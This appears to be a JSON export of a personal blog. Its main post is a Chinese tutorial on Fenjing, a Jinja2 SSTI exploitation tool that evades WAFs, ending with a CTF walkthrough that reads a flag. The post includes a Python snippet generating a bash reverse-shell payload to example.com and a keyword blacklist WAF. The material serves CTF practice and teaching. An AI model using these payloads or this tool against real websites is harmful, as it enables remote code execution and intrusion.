{"meta":{"title":"yixinBC's blog","subtitle":"always learning","description":"yixinBC的个人博客","author":"yixinBC","url":"https://yixinbc.tech","root":"/"},"pages":[],"posts":[{"title":"fenjing(焚靖)——jinja2 SSTI一把梭","slug":"fenjing","date":"2023-05-11T18:36:24.000Z","updated":"2023-05-11T12:08:21.721Z","comments":true,"path":"2023/05/11/fenjing/","link":"","permalink":"https://yixinbc.tech/2023/05/11/fenjing/","excerpt":"","text":"焚靖是一个针对Jinja2 SSTI的命令行脚本，具有强大的自动绕过WAF功能 安装使用pip（最省事）12pip install fenjingpython -m fenjing scan --url &#x27;http://xxx/&#x27; 也可下载并运行docker镜像12docker pull marven11/fenjingdocker run --net host -it marven11/fenjing scan --url &#x27;http://xxx/&#x27; 还可以直接下载源码12git clone https://github.com/Marven11/Fenjingcd Fenjing 下载后可以选择直接使用（先确保用pip安装完依赖） 1python -m pip install -r requirements.txt 也可以手动构建一个docker镜像 12docker build -t fenjing .docker run -it --net host fenjing scan --url &#x27;http://xxx/&#x27; 使用12345678910111213141516171819202122232425262728293031323334$ python -m fenjing --helpUsage: python -m fenjing [OPTIONS] COMMAND [ARGS]...Options: --help Show this message and exit.Commands: crack 攻击指定的表单 scan 扫描指定的网站$ python -m fenjing crack --helpUsage: python -m fenjing crack [OPTIONS] 攻击指定的表单Options: -u, --url TEXT form所在的URL -a, --action TEXT form的action，默认为当前路径 -m, --method TEXT form的提交方式，默认为POST -i, --inputs TEXT form的参数，以逗号分隔 -e, --exec-cmd TEXT 成功后执行的shell指令，不填则成功后进入交互模式 --interval FLOAT 每次请求的间隔 --user-agent TEXT 请求时使用的User Agent --help Show this message and exit.$ python -m fenjing scan --helpUsage: python -m fenjing scan [OPTIONS] 扫描指定的网站Options: -u, --url TEXT 需要扫描的URL -e, --exec-cmd TEXT 成功后执行的shell指令，不填则进入交互模式 --interval FLOAT 每次请求的间隔 --user-agent TEXT 请求时使用的User Agent --help Show this message and exit. 也可做为一个python模块集成进脚本中使用 12345678910111213141516171819202122from fenjing import exec_cmd_payloadimport logginglogging.basicConfig(level = logging.INFO)def waf(s: str): blacklist = [ &quot;config&quot;, &quot;self&quot;, &quot;g&quot;, &quot;os&quot;, &quot;class&quot;, &quot;length&quot;, &quot;mro&quot;, &quot;base&quot;, &quot;request&quot;, &quot;lipsum&quot;, &quot;[&quot;, &#x27;&quot;&#x27;, &quot;&#x27;&quot;, &quot;_&quot;, &quot;.&quot;, &quot;+&quot;, &quot;~&quot;, &quot;&#123;&#123;&quot;, &quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;, &quot;０&quot;,&quot;１&quot;,&quot;２&quot;,&quot;３&quot;,&quot;４&quot;,&quot;５&quot;,&quot;６&quot;,&quot;７&quot;,&quot;８&quot;,&quot;９&quot; ] for word in blacklist: if word in s: return False return Truepayload, _ = exec_cmd_payload(waf, &quot;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1\\&quot;&quot;)print(payload) 支持的绕过 &#39;和&quot;的绕过 绝大部分关键字的绕过 自然数的绕过 下划线_ +和- ~ [下标访问的绕过 &#123;&#123;&#125;&#125;标签的绕过 使用示例[GDOUCTF 2023]&lt;ez_ze&gt;打开题目发现是一个使用POST提交表单的网页，检查响应头的Sever字段，发现是Werkzeug/2.2.3 Python/3.8.16，所以应该是一个flask程序，考虑SSTI。使用一些常见的jinja2 SSTI payload，发现都会被WAF给过滤。尝试焚靖一把梭： 123456789101112131415161718$ python -m fenjing crack -u http://node1.anna.nssctf.cn:28140/get_flag -i name ____ _ _ / __/__ ____ (_|_)___ ____ _ / /_/ _ \\/ __ \\ / / / __ \\/ __ `/ / __/ __/ / / / / / / / / / /_/ //_/ \\___/_/ /_/_/ /_/_/ /_/\\__, / /___/ /____/...INFO:[cli] | Use Ctrl+D to exit.$&gt;&gt; cat /flag...Hello, $ NSSCTF&#123;82377006-eb0f-4ebd-9a9f-ba6ad3ba7c17&#125; $!$&gt;&gt; 可见焚靖的WAF绕过能力还是非常强大的 参考资料Marven11&#x2F;Fenjing: 一个类似SQLMap的Jinja2 SSTI利用脚本 | A SQLMap-like Jinja2 SSTI cracker（官方GitHub页面） 想找一个通用的SSTI payload生成器？可以去尝试一下tplmap","categories":[],"tags":[],"author":"yixinBC"},{"title":"Hexo + volantis配置","slug":"hello-world","date":"2023-04-21T15:00:00.000Z","updated":"2023-05-11T12:08:21.721Z","comments":true,"path":"2023/04/21/hello-world/","link":"","permalink":"https://yixinbc.tech/2023/04/21/hello-world/","excerpt":"","text":"移步GitHub 仓库查看配置文件源码。","categories":[],"tags":[],"author":"yixinBC"}],"categories":[],"tags":[]}